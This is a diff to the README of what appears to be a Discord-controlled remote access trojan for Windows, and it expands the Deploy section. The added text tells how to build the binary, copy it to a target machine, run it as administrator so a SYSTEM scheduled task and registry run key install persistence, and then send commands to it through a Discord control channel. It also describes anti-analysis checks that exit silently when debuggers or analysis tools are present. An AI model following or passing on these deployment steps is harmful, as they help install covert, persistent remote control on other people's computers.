@@ -66,13 +66,24 @@ The token, channel ID, and admin ID are XOR-obfuscated in source — never in pl
 
 ## Deploy
 
-Copy the `.exe` to the target machine and run it. The binary handles everything automatically:
+Build the `.exe` on your build machine, copy it to the target, run it as administrator. That's it.
 
-- **First run:** runs anti-analysis defenses, installs itself as persistent (scheduled task + registry run key), announces in the control channel, starts polling.
-- **On reboot:** the scheduled task restarts the binary automatically — no manual step needed.
-- **Stop:** end the process in Task Manager. Persistence remains; the binary restarts at next logon.
+**Deployment flow:**
 
-The binary is the persistence. Copy it, run it, and it stays.
+1. **Build** on your machine (see [Build](#build)) — produces one `.exe`
+2. **Copy** the `.exe` to the target machine (USB, network share, RDP copy — any method works; it's a single file with no installer and no dependencies)
+3. **Run as administrator** on the target — the scheduled task is created with SYSTEM privileges, which requires admin rights. If run without admin, the binary still works but persistence may not install.
+4. **Control** from your Discord channel — send commands to the control channel, the matching target executes and responds.
+
+**First run behavior:**
+- Anti-analysis defenses run first — if a debugger or analysis tool (ProcmDump, Process Hacker, x64dbg, etc.) is detected, the binary exits silently with no output. Close the tool and run again.
+- If defenses pass, the binary installs persistence (scheduled task + registry run key), announces itself in the control channel, and starts polling.
+
+**On reboot:** the scheduled task restarts the binary automatically — no manual step needed.
+
+**Stop:** end the process in Task Manager. Persistence remains; the binary restarts at next logon. To fully remove, see [Cleanup](#cleanup).
+
+The binary is the persistence. Copy it, run it as admin, and it stays.
 
 ## Commands
 
